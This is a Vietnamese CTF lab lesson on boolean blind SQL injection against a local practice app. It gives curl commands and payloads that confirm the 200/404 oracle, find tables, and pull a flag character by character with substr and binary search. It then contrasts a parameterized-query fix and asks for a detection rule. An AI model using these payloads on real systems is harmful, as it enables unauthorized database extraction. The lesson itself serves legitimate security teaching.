# Bài 15 · Blind SQL Injection — rút dữ liệu từng bit (LAB-18)

**Mục tiêu:** dạng SQLi khó nhất — response KHÔNG lộ dữ liệu và không lộ lỗi.
Chỉ còn một tín hiệu duy nhất: trang tồn tại (200) hay không tìm thấy (404).
Đó là **oracle boolean** — hỏi DB câu đúng/sai, một lần một bit.

## 1. Xác nhận oracle

```bash
curl -s -o /dev/null -w '%{http_code}\n' \
  "http://127.0.0.1:3000/track?code=AB-100' AND 1=1 --"
# → 200  (điều kiện đúng → đơn hàng hiện)

curl -s -o /dev/null -w '%{http_code}\n' \
  "http://127.0.0.1:3000/track?code=AB-100' AND 1=2 --"
# → 404  (điều kiện sai → "không tìm thấy")
```

Khác biệt 200/404 là tín hiệu khai thác. (Để ý payload `1=1` KHÔNG có dấu
nháy: `'1'='1 --` sẽ làm nháy cuối dính vào literal → điều kiện luôn sai —
lỗi kinh điển của người mới.)

## 2. Dò bảng/cột (dùng chính oracle)

```bash
# Có bảng ctf_blind không?
"AB-100' AND (SELECT count(*) FROM ctf_blind)>=0 --"     # → 200 = tồn tại
# Cột flag có trong đó không? (lỗi → 404)
"AB-100' AND (SELECT flag FROM ctf_blind LIMIT 1) IS NOT NULL --"
```

## 3. Rút cờ từng ký tự — substr oracle

```bash
# Ký tự thứ 1 của flag có phải 'F'?
"AB-100' AND (SELECT substr(flag,1,1) FROM ctf_blind)='F' --"   # → 200 ✓
"AB-100' AND (SELECT substr(flag,1,1) FROM ctf_blind)='Z' --"   # → 404 ✗
```

Lặp N=1,2,3… và thử từng ký tự — mỗi ký tự đúng trả 200. Viết script ~10
dòng (node/python) để tự động hoá — đây chính xác là cách sqlmap
`--technique=B` hoạt động.

## 4. Tối ưu: binary search thay vì thử hết

Thay vì thử 256 ký tự mỗi vị trí, hỏi `substr(...) > 'M'` để chia đôi không
gian tìm — ~8 câu hỏi/ký tự thay vì trung bình ~100.

## Đối chứng

Hardened (`:3001`) dùng `trackShipmentSafe()` — parameterized query coi
cả payload là chuỗi literal → `AND 1=1` cũng trả 404, oracle biến mất.
Đây là "chết oracle" chứ không chỉ "chặn payload".

## Tiêu chí hoàn thành

- [ ] Lấy trọn cờ `FLAG{blind-...}` (CTF #10 — 40 điểm, khó nhất lab).
- [ ] Viết script tự động rút flag (đếm số request: ~N ký tự × ~k lần thử).
- [ ] Giải thích vì sao time-based blind còn tồn tại khi response giống hệt
      nhau (SLEEP() — lab không implement nhưng hãy trả lời lý thuyết).
- [ ] Viết 1 detect-rule đếm số request `/track?code=` có pattern SQL theo IP.
